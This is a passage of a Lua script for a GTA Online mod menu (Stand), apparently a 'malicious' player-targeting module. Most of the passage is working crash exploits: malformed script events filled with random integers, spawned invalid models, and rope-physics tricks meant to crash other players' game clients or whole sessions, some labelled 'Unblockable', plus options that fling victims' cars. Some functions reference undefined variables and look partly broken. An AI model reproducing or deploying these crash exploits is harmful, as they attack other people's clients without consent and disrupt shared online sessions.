                entities.delete_by_handle(glitched_ped) 
            end
            if glitch_obj ~= nil then 
                entities.delete_by_handle(glitch_obj)
            end
        end
    end)

    menu.action_slider(glitchiar, "Launch player car", {}, "", launch_vehicle, function(index, value)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            util.toast("No esta en un vehiculo. D:")
            return
        end

        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            util.yield()
        end

        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
            util.toast("You cannot control the vehicle. D:")
            return
        end

        pluto_switch value do
            case "Lanzar Arriba":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Adelante":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Atras":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, -100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Abajo":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, -100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Catapulta":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            end
        end)





    crashes = menu.list(malicious, "Crashes", {}, "Crashes Op", function(); end)

    local begcrash = {
		"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Please close your game, please please please please please",
	}

	menu.action(crashes, "Frame Crash", {}, "Blocked by popular menus", function()
		menu.trigger_commands("smstext" .. PLAYER.GET_PLAYER_NAME(player_id).. " " .. begcrash[math.random(1, #begcrash)])
		util.yield()
		menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(player_id))
	end)

    menu.action(crashes, "Model V1", {"crashv1"}, "Funcando (Menus populares - Stand)", function()
        local mdl = util.joaat('a_c_poodle')
        BlockSyncs(player_id, function()
            if request_model(mdl, 2) then
                local pos = players.get_position(player_id)
                util.yield(100)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 3, 0), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1500)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1000)
            else
                util.toast("Error loading model.")
            end
        end)
    end)
	
	    menu.action(crashes, "Script V1", {}, "Script Based Crash", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
--end)
    end)
   
    --menu.action(crashes, "Test", {""}, "", function()
    --    local user = players.user()
    --    local user_ped = players.user_ped()
    --    local pos = players.get_position(user)
    --    BlockSyncs(player_id, function()
    --        util.yield(100)
    --        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    --        util.yield()
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    --        util.yield(250)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    --        util.yield(1000)
    --        for i = 1, 5 do
    --            util.spoof_script("freemode", SYSTEM.WAIT)
    --        end
    --        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    --        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
    --    end)
    --end)
	
	menu.divider(crashes, "(Sesion)")
	   
    menu.action(crashes, "Crash Sesion V1", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local hashes = {2132890591, 2727244247}
        local pc = players.get_position(player_id)
        local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
        local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
        local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
        local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
        util.yield(1000)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        entities.delete_by_handle(veh); entities.delete_by_handle(ped)
        PHYSICS.DELETE_CHILD_ROPE(rope)
        PHYSICS.ROPE_UNLOAD_TEXTURES()
    end)
    menu.action(crashes, "Crash Sesion V2", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        pos.x = pos.x+5
        ppos.z = ppos.z+1
        cargobob = entities.create_vehicle(2132890591, pos, 0)
        cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
        kur = entities.create_ped(26, 2727244247, ppos, 0)
        kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
        ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
        newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    end)
	
    menu.divider(crashes, "(Ryze Exclusivo)")
	

    menu.action(crashes, "Unblockable", {"crashv2"}, "(Popular menus - Stand)", function()
        for i = 1, 150 do
            util.trigger_script_event(1 << player_id, {0xA4D43510, player_id, 0xDF607FCD, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
    end)

    menu.action(crashes, "Unblockable V2", {"crashv3"}, "(Popular menus - Stand)", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 150 do
            util.trigger_script_event(1 << player_id, {2765370640, player_id, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {1348481963, player_id, math.random(int_min, int_max)})
        end
        menu.trigger_commands("givesh " .. players.get_name(player_id))
        util.yield(100)
        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
    end)
	
	local twotake = menu.list(crashes, "2T1 Crashes", {}, "")

    local modelc = menu.list(twotake, "Model Crashes", {}, "")


    menu.action(modelc, "Invaild Model V1", {"crashv4"}, "", function()
        BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)
    end)

    menu.action(modelc, "Invaild Model V2", {"crashv5"}, "", function()
        BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)

    end)

    menu.action(modelc, "Invaild Model V3", {"crashv10"}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local hash = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            STREAMING.REQUEST_MODEL(hash)
            util.yield(5)
        end
        --coord.z -= 1
        local ped = {}
        for i = 0, 10 do
            local coord = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
            ped[i] = entities.create_ped(0, hash, coord, 0)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
            --FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pedcoord.x, pedcoord.y, pedcoord.z, 5, 10, false, false, 0)
            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(player_id) .. " explode " .. PLAYER.GET_PLAYER_NAME(player_id) .. " ")
            ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
        util.yield(25)
        end
        util.yield(2500)
        for i = 0, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(10)
        end

    end)

    menu.action(modelc, "Invaild Model V4", {"crashv12"}, "", function(on_toggle)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            for i = 0, 100 do 
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            return
        end
    end)
	
	    menu.action(modelc, "Invalid Model V5", {"crashv18"}, "Skid from x-force", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                local pos = players.get_position(player_id)
                local mdl = util.joaat("u_m_m_jesus_01")
                local veh_mdl = util.joaat("oppressor")
                util.request_model(veh_mdl)
        util.request_model(mdl)
                        for i = 1, 10 do
                                if not players.exists(player_id) then
                                        return
                                end
                                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                                local jesus = entities.create_ped(2, mdl, pos, 0)
                                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                                util.yield(100)
                                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                                util.yield(1000)
                                entities.delete_by_handle(jesus)
                                entities.delete_by_handle(veh)
                        end
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)
    menu.action(modelc, "Invalid Model V6", {"crashv19"}, "Skid from x-force", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)
    menu.action(modelc, "Invalid Model V7", {"crashv26"}, "Skid from x-force", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
    end)
    menu.action(modelc, "Invalid Model V8 'Test (1 use)'", {"crashv27"}, "Skid from x-force (Big CHUNGUS)", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = players.get_position(player_id)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        for i = 1, 250 do
            local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
            local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
            local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            util.yield(100)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
        
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
    end)
	
    local netc = menu.list(twotake, "Network crashes", {}, "")
	
    -- Skidded from keramist.
    menu.action(netc, "Network crash V1", {"crashv13"}, "", function(on_toggle)
        local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
        local vehicles = {}
        for i = 1, 4 do
            util.create_thread(function()
                request_model(hashes[i])
                local pcoords = players.get_position(player_id)
                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                for j = 0, 49 do
                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
                end
                for j = 0, 20 do
                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
                end
                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
                for ai = 1, 50 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    pcoords = players.get_position(player_id)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                    util.yield()
                end
                vehicles[#vehicles+1] = veh
            end)
        end
        util.yield(2000)
        for _, v in pairs(vehicles) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
            entities.delete_by_handle(v)
        end
    end)
    menu.action(netc, "Network crashe V2", {"crashv14"}, "", function(on_loop)
        local cord = players.get_position(player_id)
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
        end
        util.toast("Finished.")
    end)
	
	    local scrcrash = menu.list(twotake, "Script Crashes", {}, "")

    menu.action(scrcrash, "Script Crash V1", {"crashv6"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {2765370640, player_id, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
